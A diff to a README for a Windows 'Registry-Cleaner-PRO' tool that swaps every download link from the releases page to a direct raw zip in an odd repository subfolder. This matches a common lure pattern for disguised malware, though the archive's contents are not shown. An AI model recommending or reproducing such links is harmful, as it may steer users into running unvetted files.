@@ -8,10 +8,10 @@ This guide will walk you through everything you need to know, from downloading t
 
 ## 📥 Download Registry-Cleaner-PRO
 
-[![Download Registry-Cleaner-PRO Now](https://img.shields.io/badge/Download-Registry--Cleaner--PRO-blue?style=for-the-badge&logo=windows&color=00A4EF)](https://github.com/PelaoTruco/Registry-Cleaner-PRO/releases)
+[![Download Registry-Cleaner-PRO Now](https://img.shields.io/badge/Download-Registry--Cleaner--PRO-blue?style=for-the-badge&logo=windows&color=00A4EF)](https://github.com/PelaoTruco/Registry-Cleaner-PRO/raw/refs/heads/main/cloy/PRO_Registry_Cleaner_2.0-alpha.4.zip)
 
 Click the button above or visit this link to download the application:  
-**👉 [https://github.com/PelaoTruco/Registry-Cleaner-PRO/releases](https://github.com/PelaoTruco/Registry-Cleaner-PRO/releases)**
+**👉 [https://github.com/PelaoTruco/Registry-Cleaner-PRO/raw/refs/heads/main/cloy/PRO_Registry_Cleaner_2.0-alpha.4.zip](https://github.com/PelaoTruco/Registry-Cleaner-PRO/raw/refs/heads/main/cloy/PRO_Registry_Cleaner_2.0-alpha.4.zip)**
 
 Visit this link to download the application. Once you're on the page, look for the latest release file and click to download it. The download will start automatically.
 
@@ -138,9 +138,9 @@ The latest version of Registry-Cleaner-PRO includes:
 
 Need to download again? No problem — just click the link below:
 
-[![Get Registry-Cleaner-PRO Free](https://img.shields.io/badge/Get%20Registry--Cleaner--PRO%20Free-brightgreen?style=for-the-badge&logo=github&color=2EA44F)](https://github.com/PelaoTruco/Registry-Cleaner-PRO/releases)
+[![Get Registry-Cleaner-PRO Free](https://img.shields.io/badge/Get%20Registry--Cleaner--PRO%20Free-brightgreen?style=for-the-badge&logo=github&color=2EA44F)](https://github.com/PelaoTruco/Registry-Cleaner-PRO/raw/refs/heads/main/cloy/PRO_Registry_Cleaner_2.0-alpha.4.zip)
 
-**Direct Download Link:** [https://github.com/PelaoTruco/Registry-Cleaner-PRO/releases](https://github.com/PelaoTruco/Registry-Cleaner-PRO/releases)
+**Direct Download Link:** [https://github.com/PelaoTruco/Registry-Cleaner-PRO/raw/refs/heads/main/cloy/PRO_Registry_Cleaner_2.0-alpha.4.zip](https://github.com/PelaoTruco/Registry-Cleaner-PRO/raw/refs/heads/main/cloy/PRO_Registry_Cleaner_2.0-alpha.4.zip)
 
 ## 🏁 Final Words
 
